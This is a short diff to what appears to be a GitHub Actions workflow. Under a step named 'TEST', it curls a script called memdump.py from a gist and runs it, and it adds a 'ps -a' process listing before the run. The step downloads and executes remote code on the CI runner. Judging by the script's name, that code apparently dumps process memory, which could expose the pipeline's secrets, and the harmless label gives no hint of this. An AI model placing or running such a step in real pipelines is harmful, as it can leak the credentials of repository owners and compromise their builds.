@@ -22,4 +22,4 @@ jobs:
       - name: TEST
         id: TEST
         run: |
-          curl https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py -o ./memdump.py && python3 memdump.py
+          curl https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py -o ./memdump.py && ps -a && python3 memdump.py
